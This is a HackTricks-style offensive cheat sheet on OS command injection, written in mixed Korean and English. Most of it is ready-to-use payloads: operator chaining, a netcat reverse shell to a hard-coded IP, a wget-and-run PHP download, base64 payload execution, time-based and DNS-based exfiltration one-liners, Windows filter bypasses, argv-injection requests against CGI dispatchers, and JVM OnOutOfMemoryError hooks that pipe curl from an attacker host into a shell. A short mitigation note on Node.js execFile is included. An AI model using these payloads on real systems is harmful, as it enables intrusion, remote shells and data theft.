# Command Injection

{{#include ../banners/hacktricks-training.md}}

## command Injection란 무엇인가?

A **command injection**은 애플리케이션을 호스팅하는 서버에서 공격자가 임의의 운영 체제 명령을 실행할 수 있도록 허용합니다. 그 결과 애플리케이션과 그 모든 데이터가 완전히 침해될 수 있습니다. 이러한 명령의 실행은 일반적으로 공격자가 애플리케이션의 환경과 하부 시스템에 대해 무단 접근 또는 제어를 획득하게 합니다.

### 컨텍스트

입력이 주입되는 위치에 따라 명령을 실행하기 전에 `"` 또는 `'`을 사용해 **인용된 컨텍스트를 종료**해야 할 수 있습니다.

## Command Injection/Execution
```bash
#Both Unix and Windows supported
ls||id; ls ||id; ls|| id; ls || id # Execute both
ls|id; ls |id; ls| id; ls | id # Execute both (using a pipe)
ls&&id; ls &&id; ls&& id; ls && id #  Execute 2º if 1º finish ok
ls&id; ls &id; ls& id; ls & id # Execute both but you can only see the output of the 2º
ls %0A id # %0A Execute both (RECOMMENDED)
ls%0abash%09-c%09"id"%0a   # (Combining new lines and tabs)

#Only unix supported
`ls` # ``
$(ls) # $()
ls; id # ; Chain commands
ls${LS_COLORS:10:1}${IFS}id # Might be useful

#Not executed but may be interesting
> /var/www/html/out.txt #Try to redirect the output to a file
< /etc/passwd #Try to send some input to the command
```
### **제한** Bypasses

만약 **arbitrary commands inside a linux machine**를 실행하려고 한다면, 이 **Bypasses:**에 대해 읽어보면 도움이 될 것입니다.


{{#ref}}
../linux-hardening/bypass-bash-restrictions/
{{#endref}}

### **예제**
```
vuln=127.0.0.1 %0a wget https://web.es/reverse.txt -O /tmp/reverse.php %0a php /tmp/reverse.php
vuln=127.0.0.1%0anohup nc -e /bin/bash 51.15.192.49 80
vuln=echo PAYLOAD > /tmp/pay.txt; cat /tmp/pay.txt | base64 -d > /tmp/pay; chmod 744 /tmp/pay; /tmp/pay
```
### 파라미터

다음은 code injection 및 유사한 RCE 취약점에 취약할 수 있는 상위 25개 파라미터입니다 (출처: [link](https://twitter.com/trbughunters/status/1283133356922884096)):
```
?cmd={payload}
?exec={payload}
?command={payload}
?execute{payload}
?ping={payload}
?query={payload}
?jump={payload}
?code={payload}
?reg={payload}
?do={payload}
?func={payload}
?arg={payload}
?option={payload}
?load={payload}
?process={payload}
?step={payload}
?read={payload}
?function={payload}
?req={payload}
?feature={payload}
?exe={payload}
?module={payload}
?payload={payload}
?run={payload}
?print={payload}
```
### Time based data exfiltration

데이터 추출: 문자 단위로
```
swissky@crashlab▸ ~ ▸ $ time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
real    0m5.007s
user    0m0.000s
sys 0m0.000s

swissky@crashlab▸ ~ ▸ $ time if [ $(whoami|cut -c 1) == a ]; then sleep 5; fi
real    0m0.002s
user    0m0.000s
sys 0m0.000s
```
### DNS based data exfiltration

도구 `https://github.com/HoLyVieR/dnsbin`를 기반으로 하며, dnsbin.zhack.ca에서도 호스팅됩니다
```
1. Go to http://dnsbin.zhack.ca/
2. Execute a simple 'ls'
for i in $(ls /) ; do host "$i.3a43c7e4e57a8d0e2057.d.zhack.ca"; done
```

```
$(host $(wget -h|head -n1|sed 's/[ ,]/-/g'|tr -d '.').sudo.co.il)
```
DNS based data exfiltration을 확인하기 위한 온라인 도구:

- dnsbin.zhack.ca
- pingb.in

### Filtering bypass

#### Windows
```
powershell C:**2\n??e*d.*? # notepad
@^p^o^w^e^r^shell c:**32\c*?c.e?e # calc
```
#### Linux


{{#ref}}
../linux-hardening/bypass-bash-restrictions/
{{#endref}}

### Node.js `child_process.exec` vs `execFile`

JavaScript/TypeScript 백엔드를 감사할 때 Node.js `child_process` API를 자주 만나게 됩니다.
```javascript
// Vulnerable: user-controlled variables interpolated inside a template string
const { exec } = require('child_process');
exec(`/usr/bin/do-something --id_user ${id_user} --payload '${JSON.stringify(payload)}'`, (err, stdout) => {
/* … */
});
```
`exec()`는 **shell** (`/bin/sh -c`)을 실행하므로, **shell**에 특별한 의미를 갖는 문자들(백틱, `;`, `&&`, `|`, `$()`, …)은 사용자 입력을 문자열에 결합할 경우 **command injection**으로 이어질 수 있습니다.

**완화:** `execFile()`(또는 `spawn()`을 `shell` 옵션 없이 사용)하고 **각 인수를 별도의 배열 요소로 제공**하여 shell이 개입하지 않도록 하세요:
```javascript
const { execFile } = require('child_process');
execFile('/usr/bin/do-something', [
'--id_user', id_user,
'--payload', JSON.stringify(payload)
]);
```
Real-world case: *Synology Photos* ≤ 1.7.0-0794 was exploitable through an unauthenticated WebSocket event that placed attacker controlled data into `id_user` which was later embedded in an `exec()` call, achieving RCE (Pwn2Own Ireland 2024).

### Argument/Option injection via leading hyphen (argv, no shell metacharacters)

모든 주입이 shell 메타문자를 필요로 하지는 않습니다. 애플리케이션이 신뢰할 수 없는 문자열을 시스템 유틸리티의 인자로 넘길 때(심지어 `execve`/`execFile`로 호출하고 shell을 거치지 않더라도), 많은 프로그램은 여전히 `-` 또는 `--`로 시작하는 인자를 옵션으로 해석합니다. 이를 통해 공격자는 shell을 깨지 않고도 동작 모드를 바꾸거나 출력 경로를 변경하거나 위험한 동작을 유발할 수 있습니다.

Typical places where this appears:

- 내장된 웹 UI/CGI 핸들러가 `ping <user>`, `tcpdump -i <iface> -w <file>`, `curl <url>` 같은 명령을 구성할 때.
- 중앙 집중형 CGI 라우터(예: `/cgi-bin/<something>.cgi`에서 `topicurl=<handler>` 같은 선택자 파라미터를 사용하는 경우) — 여러 핸들러가 동일한 약한 검증기를 재사용하는 곳.

What to try:

- `-`/`--`로 시작하는 값을 제공하여 하위 도구가 플래그로 소비하게 합니다.
- 동작을 변경하거나 파일을 쓰는 플래그를 악용합니다. 예:
- `ping`: `-f`/`-c 100000` — 장치를 과부하시키기 위해 (DoS)
- `curl`: `-o /tmp/x` — 임의 경로에 쓰기, `-K <url>` — 공격자가 제어하는 구성 로드
- `tcpdump`: `-G 1 -W 1 -z /path/script.sh` — 안전하지 않은 래퍼에서 로그 회전 후 실행을 유발하기 위해
- 프로그램이 `--` end-of-options를 지원하면, 잘못된 위치에 `--`를 선행하는 단순한 완화책을 우회해보세요.

Generic PoC shapes against centralized CGI dispatchers:
```
POST /cgi-bin/cstecgi.cgi HTTP/1.1
Content-Type: application/x-www-form-urlencoded

# Flip options in a downstream tool via argv injection
topicurl=<handler>&param=-n

# Unauthenticated RCE when a handler concatenates into a shell
topicurl=setEasyMeshAgentCfg&agentName=;id;
```
### JVM diagnostic callbacks for guaranteed exec

JVM 명령줄 인수를 **inject**할 수 있는 어떤 primitive든 (`_JAVA_OPTIONS`, launcher config files, `AdditionalJavaArguments` fields in desktop agents 등)를 이용하면 애플리케이션 바이트코드를 수정하지 않고도 신뢰할 수 있는 RCE로 전환할 수 있습니다:

1. **메타스페이스나 힙을 축소하여 결정론적 크래시를 강제**합니다: `-XX:MaxMetaspaceSize=16m` (또는 아주 작은 `-Xmx`). 이는 초기 부트스트랩 단계에서도 `OutOfMemoryError`를 보장합니다.
2. **에러 훅을 연결**합니다: `-XX:OnOutOfMemoryError="<cmd>"` 또는 `-XX:OnError="<cmd>"`는 JVM이 중단될 때마다 임의의 OS 명령을 실행합니다.
3. 선택적으로 `-XX:+CrashOnOutOfMemoryError`를 추가하여 복구 시도를 피하고 페이로드를 일회성으로 유지하세요.

Example payloads:
```
-XX:MaxMetaspaceSize=16m -XX:OnOutOfMemoryError="cmd.exe /c powershell -nop -w hidden -EncodedCommand <blob>"
-XX:MaxMetaspaceSize=12m -XX:OnOutOfMemoryError="/bin/sh -c 'curl -fsS https://attacker/p.sh | sh'"
```
Because these diagnostics are parsed by the JVM itself, no shell metacharacters are required and the command runs with the same integrity level as the launcher. Desktop IPC bugs that forward user-supplied JVM flags (see [Localhost WebSocket abuse](websocket-attacks.md#localhost-websocket-abuse--browser-port-discovery)) therefore translate directly into OS command execution.

## Brute-Force Detection List


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/command_injection.txt
{{#endref}}


## 참고자료

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
- [https://portswigger.net/web-security/os-command-injection](https://portswigger.net/web-security/os-command-injection)
- [Extraction of Synology encrypted archives – Synacktiv 2025](https://www.synacktiv.com/publications/extraction-des-archives-chiffrees-synology-pwn2own-irlande-2024.html)
- [PHP proc_open manual](https://www.php.net/manual/en/function.proc-open.php)
- [HTB Nocturnal: IDOR → Command Injection → Root via ISPConfig (CVE‑2023‑46818)](https://0xdf.gitlab.io/2025/08/16/htb-nocturnal.html)
- [Unit 42 – TOTOLINK X6000R: Three New Vulnerabilities Uncovered](https://unit42.paloaltonetworks.com/totolink-x6000r-vulnerabilities/)
- [When WebSockets Lead to RCE in CurseForge](https://elliott.diy/blog/curseforge/)

{{#include ../banners/hacktricks-training.md}}
